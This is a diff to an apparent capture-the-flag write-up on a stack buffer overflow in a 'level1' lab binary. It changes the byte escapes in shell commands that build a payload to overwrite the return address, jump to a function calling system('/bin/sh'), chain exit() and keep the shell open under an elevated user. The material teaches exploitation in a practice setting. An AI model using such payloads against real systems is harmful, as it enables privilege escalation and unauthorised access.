@@ -145,14 +145,14 @@ By overwriting the **Return Address**, we can hijack the program's control flow 
 
 We wish to execute commands such as `system("/bin/sh")` or `execve("/bin/sh", NULL, NULL)` to spawn a new shell that inherits the EUID *(level2)* of the process.
 
-The `run()` function available in the binary calls `system("/bin/sh")` for us. It's stack frame starts at the following address: `0x08048444` (or `\x44\x84\x04\x08` in **little-endian hexadecimal byte escaped format**).
+The `run()` function available in the binary calls `system("/bin/sh")` for us. It's stack frame starts at the following address: `0x08048444` (or `\x44\x84\x04\x08` in **little-endian hexadecimal byte escaped format** or `\104\204\004\010` in **little-endian octal byte escaped format**).
 
 ```sh
 $ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
 $ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
-$ run_retaddr="$(printf "\x44\x84\x04\x08")"; # `main()`s Return address, set to `run()` = 4 bytes.
+$ run_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
 $ payload="${local_vars_filler}${ebp_filler}${run_retaddr}";
-$ (echo -ne "$payload\n") | ~/level1
+$ (printf "%b" "$payload\n") | ~/level1
 Good... Wait what?
 Segmentation fault (core dumped)
 ```
@@ -182,16 +182,18 @@ $ gdb -batch -ex "start" -ex "p exit" ./level1
 Temporary breakpoint 1 at 0x8048483
 
 Temporary breakpoint 1, 0x08048483 in main ()
-$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit> # <=> \xe0\xeb\xe5\xb7
+$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+# hexadecimal => \xe0\xeb\xe5\xb7
+# octal => \340\353\345\267
 ```
 
 ```sh
 $ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
 $ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
-$ run_retaddr="$(printf "\x44\x84\x04\x08")"; # `main()`s Return address, set to `run()` = 4 bytes.
-$ exit_retaddr="$(printf "\xe0\xeb\xe5\xb7")"; # `run()`s Return address, set to `exit()` = 4 bytes.
+$ run_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
+$ exit_retaddr="$(printf "%s" "\340\353\345\267")"; # `run()`s Return address, set to `exit()` = 4 bytes.
 $ payload="${local_vars_filler}${ebp_filler}${run_retaddr}${exit_retaddr}";
-$ (echo -ne "$payload\n") | ~/level1
+$ (printf "%b" "$payload\n") | ~/level1
 Good... Wait what?
 ```
 
@@ -203,10 +205,10 @@ To prevent this, we must keep the input stream's write end open for the lifetime
 ```sh
 $ local_vars_filler="$(printf "x%.0s" $(seq 72))"; # buffer (64 bytes) + padding (8 bytes) = 72 bytes.
 $ ebp_filler="$(printf "b%.0s" $(seq 4))"; # EBP = 4 bytes.
-$ run_retaddr="$(printf "\x44\x84\x04\x08")"; # `main()`s Return address, set to `run()` = 4 bytes.
-$ exit_retaddr="$(printf "\xe0\xeb\xe5\xb7")"; # `run()`s Return address, set to `exit()` = 4 bytes.
+$ run_retaddr="$(printf "%s" "\104\204\004\010")"; # `main()`s Return address, set to `run()` = 4 bytes.
+$ exit_retaddr="$(printf "%s" "\340\353\345\267")"; # `run()`s Return address, set to `exit()` = 4 bytes.
 $ payload="${local_vars_filler}${ebp_filler}${run_retaddr}${exit_retaddr}";
-$ (echo -ne "$payload\n"; cat -) | ~/level1
+$ (printf "%b" "$payload\n"; cat -) | ~/level1
 Good... Wait what?
 ```
 
